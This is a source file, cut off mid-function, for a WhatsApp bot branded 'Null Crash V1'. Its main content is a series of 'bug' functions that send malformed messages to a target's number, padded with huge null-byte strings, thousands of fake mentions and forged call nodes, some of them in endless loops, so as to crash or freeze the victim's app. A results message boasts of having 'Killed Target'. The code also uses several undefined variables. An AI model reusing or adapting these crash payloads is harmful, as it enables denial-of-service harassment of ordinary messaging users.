require("./settings");

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    jidDecode
} = require("@whiskeysockets/baileys");

const axios = require('axios');
const fs = require('fs-extra');
const crypto = require("crypto");
const util = require('util');
const chalk = require('chalk');
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");

//===============
module.exports = det = async (det, m, chatUpdate, store) => {

try {
const body = (
n.mtype === "conversation" ? n.message.conversation :
n.mtype === "imageMessage" ? n.message.imageMessage.caption :
n.mtype === "videoMessage" ? n.message.videoMessage.caption :
n.mtype === "extendedTextMessage" ? n.message.extendedTextMessage.text :
n.mtype === "buttonsResponseMessage" ? n.message.buttonsResponseMessage.selectedButtonId :
n.mtype === "listResponseMessage" ? n.message.listResponseMessage.singleSelectReply.selectedRowId :
n.mtype === "interactiveResponseMessage" ? JSON.parse(n.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
n.mtype === "templateButtonReplyMessage" ? n.message.templateButtonReplyMessage.selectedId :
n.mtype === "messageContextInfo" ?
n.message.buttonsResponseMessage?.selectedButtonId ||
n.message.listResponseMessage?.singleSelectReply.selectedRowId ||
n.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
n.text : "");

const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = args.join(" "); 
const fatkuns = n.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await det.decodeJid(det.user.id);
const sender = n.sender;
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(n.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(n.sender);
if (!det.public && !isCreator) return;

//======================
const isGroup = n.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await det.groupMetadata(n.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const senderbot = n.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" || det.user.id : n.key.participant || n.key.remoteJid;
        const senderId = senderbot.split('@')[0];
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(n.sender);
const groupName = groupMetadata.subject || "";
let example = (teks) => {
return `\n\`ᴡʀᴏɴɢ ᴄᴏᴍᴍᴀɴᴅ\` \n *ᴇxᴀᴍᴘʟᴇ ᴏғ ᴜsᴀɢᴇ* :*\nᴛʏᴘᴇ *cmd*${cmd}* ${teks}\n`
}

const jpegThumbnail = fs.readFileSync('./media/thumb.jpg');

const HKQuoted = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net", 
    remoteJid: "status@broadcast",
    id: "HKQuoted"
  },
  message: {
    extendedTextMessage: {
      text: "Nᴜʟʟ Cʀᴀsʜ V𝟷",
      title: "Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ",
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: "Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ",
          body: "telegram.com",
          mediaType: 1,
          sourceUrl: "https://telegram.com",
          thumbnail: fs.readFileSync(`./media/thumb.jpg`),
          renderLargerThumbnail: false,
          showAdAttribution: false,
        }
      }
    }
  }
};

const from = n.key.remoteJid || "";

const reply = (teks) => det.sendMessage(n.chat, { text: teks }, { quoted: HKQuoted });

async function doneress () {
  if (!text) throw "Done Response"
  let pepec = args[0].replace(/[^0-9]/g, "")
  let thumbnailUrl = "https://files.catbox.moe/4w8x5f.png"
  let ressdone = `
╭──────────────❍
│ ─( 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑲𝒊𝒍𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
│
│⪼ 𝑇𝑦𝑝𝑒 𝐵𝑢𝑔 : *${command}*
│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
╰──────────────❍

 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
` 
  
  det.sendMessage(n.chat, {
    video: {
      url: 'https://files.catbox.moe/3uhyy5.mp4'
    },
    caption: ressdone,
    gifPlayback: true,  
    contextInfo: {
      mentionedJid: [n.sender],
      externalAdReply: {
        showAdAttribution: false,
        title: 'Nᴜʟʟ Cʀᴀsʜ V𝟷',
        body: 'Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ',
        thumbnailUrl: 'https://files.catbox.moe/4w8x5f.png',
        sourceUrl: 'https://whatsapp.com/channel/0029VbBwJYo6BIEp0Xlm1G0S',
        mediaType: 2,
        renderLargerThumbnail: false
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363419855570475@newsletter',
        newsletterName: 'Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ',
        serverMessageId: -1
      }
    },
    headerType: 5,
    viewOnce: false
  }, { quoted: HKQuoted });

//=================== ( Console Message ) ===========\\
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold(" MASSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Sender:")} ${chalk.hex("#FFFFFF")(`${n.pushName} (${n.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 In:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 message :")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//=============(   Bugs functions  ) ======\\
async function xxx(det, target) {
    
    const msg2 = {
        interactiveMessage: {
            header: {
                title: "Iamsatz",
                },
            body: {},
            footer: {
                text: "satz",
                hasMediaAttachment: true,
      audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mp4",
      fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
      fileLength: "109951162777600",
      seconds: 1,
      ptt: true,
      mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
      fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
      directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774107510",
      waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
      }
    },
            nativeFlowMessage: {
                buttons: [
                    {
  name: "single_select",
  buttonParamsJson: JSON.stringify({
    title: "Iamsatz",
    sections: [
      {
        title: "",
        rows: Array.from({ length: 4 }, (_, i) => ({
          id: "\u0000".repeat(9000),
          title: "\u0000".repeat(10000)
        }))
      }
    ]
  })
},
                    {
  name: "cta_call",
  buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "\u0000".repeat(5000)
                })
}
                    ]
                },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                quotedMessage: {
                    conversation: "IamSatz"
                    },
                }
            }
        }
         
        await det.relayMessage(target,msg2,{
            participant: { jid: target }
            })
}

async function bulldozer(det, target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "# ⌁𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐛𝐮𝐠✨",
            hasMediaAttachment: false,
          },
          videoMessage: {
            url: "https://mmg.whatsapp.net/...",
            mimetype: "video/mp4",
            fileSha256: "...",
            fileLength: "1073741824",
            height: 1080,
            width: 1920,
            mediaKey: "...",
            fileEncSha256: "...",
            directPath: "...",
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: [
                "13157425953@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "@s.whatsapp.net"
                ),
              ],
              expiration: 9741,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 9742,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\u0000".repeat(1045900),
            version: 3,
          },
        },
      },
    },
  };

  let msg = generateWAMessageFromContent(target, message, {});

  await det.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function MarkDelayHardInvis(det, target) {
  for (let i = 0; i < 5; i++) {
    const message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: { title: "\u0000" + "ꦾ".repeat(8000) },
            body: { text: "\u0000" + "ꦽ".repeat(8000) },
            contextInfo: {
              stanzaId: "ZyX_id",
              isForwarding: true,
              forwardingScore: 999,
              participant: target,

              mentionedJid: [
                "13333335502@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  "\u0000" +
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "13333335502@s.whatsapp.net"
                ),
              ],

              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Date.now() + 18144000000,
                },
              },

              remoteJid: "status@broadcast",
              tag: "meta",

              forwardedAiBotMessageInfo: {
                botName: "NULL CRASH",
                botJid: Math.floor(Math.random() * 99999),
                creatorName: "ZyX",
              },
            },
          },
        },
      },
    };

    try {
      await det.relayMessage(target, message, {});
    } catch {}
  }
}

async function ghj(det, target) {
  while (true) {
    try {   
      const Andros = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: "Maen Yok, Ga sor kah? ",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await det.relayMessage(target, Andros, { 
        participant: { jid: target } 
      });
      
      console.log(`Andros Bugs Succes Send To Numbers ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error AndroS Bugsss:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function SuperBugs(det, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          header: {
            title: "By EmakLoe Nih" + "{".repeat(90000),
            subtitle: "Enak Ga Todd?"
          },
          body: {
            text: "assalamu'alaikum"
          },
          footer: {
            text: "assalamualaikum"
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true
          },
          nativeFlowMessage: {
            messageParamsJson: "\u0000".repeat(4000),
            buttons: [
              {
                name: "ZyX1",
                buttonParamsJson: JSON.stringify({
                  display_text: "ZyX",
                  flow_cta: "\u0000".repeat(1000),
                  flow_message_version: "3"
                })
              },
              {
                name: "ZyX 2",
                buttonParamsJson: JSON.stringify({
                  display_text: "Makloe",
                  flow_cta: "\u0000".repeat(1000),
                  flow_message_version: "3"
                })
              },
              {
                name: "ZyX 3",
                buttonParamsJson: JSON.stringify({
                  display_text: "Makloe",
                  flow_cta: "\u0000".repeat(1000),
                  flow_message_version: "3"
                })
              }
            ]
          }
        },
        interactiveResponseMessage: {
          header: {
            title: "Aku Sange Nih Mass"
          },
          body: {
            text: "ZyX Anti Ampas"
          },
          nativeFlowResponseMessage: {
            responseParamsJson: "\u0000".repeat(9000)
          }
        }
      }
    }
  };

  await det.relayMessage(target, msg, {});
}

async function LoseBuldo(target) {
  for (let i = 0; i < 1000; i++) {
    try {
      let sejaya = {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: det.generateMessageTag ? det.generateMessageTag() : Date.now().toString(),
            participant: "0@s.whatsapp.net",
            remoteJid: "696969696969@s.whatsapp.net",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 40000 }, 
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            remoteJid2: "status@broadcast",
            mentionedJid2: [
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
              ),
            ],
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource2: "WhatsApp.com",
            entryPointConversionApp2: "WhatsApp",
            disappearingMode: {
              initiator: "INITIATED_BY_OTHER",
              trigger: "ACCOUNT_SETTING",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(15000),
            },
          },
        },
      };

      await det.relayMessage(target, sejaya, {
        messageId: det.generateMessageTag ? minzto.generateMessageTag() : (Date.now() + i).toString()
      });
      
      console.log("Buldozzer " + (i + 1));
     
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error("Error pada iterasi ke-" + i + ":", error.message);
      break; 
    }
  }
}

async function MakluGwEvve(target) {
  const Ridzz = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091", 
          isAvatar: false,
          isAiSticker: false,
          isLottie: null,
          contextInfo: {
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 500000 },
                () => ({ "\0": "\0" })
              )
            }
          }
        }
      }
    }
  }

  return await det.relayMessage("status@broadcast", Ridzz, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function Whatsapps(det, target) {
 const {
    encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    
let devices = (
await det.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await det.assertSessions(devices)

let privt = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let vion = privt();
let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let Official = det.createParticipantNodes.bind(det);
let vionoc = det.encodeWAMessage?.bind(det);

det.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (det.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = det.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));

return vion.mutex(jid, async () => {
let { type, ciphertext } = await det.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await det.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let vionlast = {
tag: "call",
attrs: { to: target, id: det.generateMessageTag(), from: det.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": det.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await det.sendNode(vionlast);

const andros = {
       interactiveMessage: {
           message: {
             stickerMessage: {
                 url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                 fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                 fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                 mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                 mimetype: "image/webp",
                 directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                 fileLength: "10610",
                 mediaKeyTimestamp: "1775044724",
                 stickerSentTs: "1775044724091"
                }
            }
        }
    };

  await det.relayMessage(target, andros, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function ziperrsedot(target, mention) {
  let MakLo = true;
  if (11 > 9) {
    MakLo = MakLo ? false : true;
  }
  
  const NanMsg1 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0&mms3=true",
            fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
            mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
            mimetype: "image/webp",
            directPath:
              "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
            fileLength: {
              low: Math.floor(Math.random() * 1000),
              high: 0,
              unsigned: true,
            },
            mediaKeyTimestamp: {
              low: Math.floor(Math.random() * 500000000),
              high: 0,
              unsigned: false,
            },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1999 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 900000) +
                    "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionsleepSeconds: 467593,
            },
            stickerSentTs: {
              low: Math.floor(Math.random() * -50000000),
              high: 1000,
              unsigned: MakLo,
            },
            isAvatar: MakLo,
            isAiSticker: MakLo,
            isLottie: MakLo,
          },
        },
      },
    },
    {}
  );
  
let NanMsg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "(🌷) ziper Not Dev?",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 500000000),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "9"),
    });

  await det.relayMessage("status@broadcast", NanMsg1.message, {
    messageId: NanMsg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await det.relayMessage("status@broadcast", NanMsg2.message, {
    messageId: NanMsg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await det.relayMessage(
      target,
      {
    statusMentionMessage: {
        message: {
           protocolMessage: {
              key: NanMsg2.key,
              participant: "131355550002@s.whatsapp.net",
              remoteJid: target,
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
  }
}

async function CV14(det, target) {
  for (let i = 0; i < 2; i++) {
    await det.relayMessage(target, {
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "i'm... Not Perfect..." + "ꦾ".repeat(61000) },
        footer: { text: "ោ៝".repeat(7000) },
        header: {
          hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
            mimetype: 'image/jpeg',
            fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
            fileLength: '99999999991',
            height: -111,
            width: 111,
            mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
            fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
            directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
            mediaKeyTimestamp: '1721344123',
            jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
            scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro='
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{",
          messageVersion: 3,
          buttons: [
          {
          name: "single_select",
          buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(30000), id: null })
        },
{
          name: "review_and_pay",
          buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(30000) })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: "ꦾ".repeat(30000),
            flow_id: "yeah, i know, i'm not perfect...",
            flow_message_version: "9",
            flow_token: "ПӨΣƧZYЦI! —"
          })
        }, 
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
        },
        {
          name: "review_and_pay",
          buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(30000) })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: "ꦾ".repeat(30000),
            flow_id: "yeah, i know, i'm not perfect...",
            flow_message_version: "9",
            flow_token: "ПӨΣƧZYЦI! —"
          })
        }
          ], 
        },
        contextInfo: {
          remoteJid: "status@broadcast",
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `88888888${i + 0}@s.whatsapp.net`),
          stanzaId: null,
          participant: "0@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: -1,
